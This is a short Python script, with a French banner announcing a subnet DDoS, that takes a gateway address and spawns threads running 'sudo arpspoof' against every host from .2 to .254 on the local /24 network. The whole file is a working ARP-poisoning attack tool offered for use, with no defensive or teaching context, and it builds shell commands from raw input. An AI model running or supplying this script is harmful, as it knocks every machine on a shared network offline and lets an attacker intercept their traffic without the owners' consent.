import subprocess
import threading
import socket
import os
import re

def run_arpspoof(ip, gateway):
    part = ".".join(gateway.split(".")[:3]) + "."
    ip_total = part + str(ip)
    command = f"sudo arpspoof -i eth0 -t {ip_total} {gateway}"
    
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(f"Standard output for {ip}:")
    print(stdout.decode())
    print(f"Standard error for {ip}:")
    print(stderr.decode())

def is_valid_ip(ip):
    return re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ip)

def is_valid_gateway(gateway):
    return is_valid_ip(gateway)

os.system("clear")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|                 DDOS UN SOUS-RESEAU                |")
print ("\---------------------------------------------------/")
print (" ")
print (" --------------------[Parametres]------------------- ")
print (" ")
gateway = input("Gateway IP  : ")
ip = socket.gethostbyname(socket.gethostname())

if not is_valid_gateway(gateway) or not is_valid_ip(ip):
    print("Invalid IP or gateway. Please provide valid inputs.")
else:
    threads = []
    for i in range(2, 255):
        if i != int(ip.split(".")[-1]):
            thread = threading.Thread(target=run_arpspoof, args=(i, gateway))
            threads.append(thread)
            thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
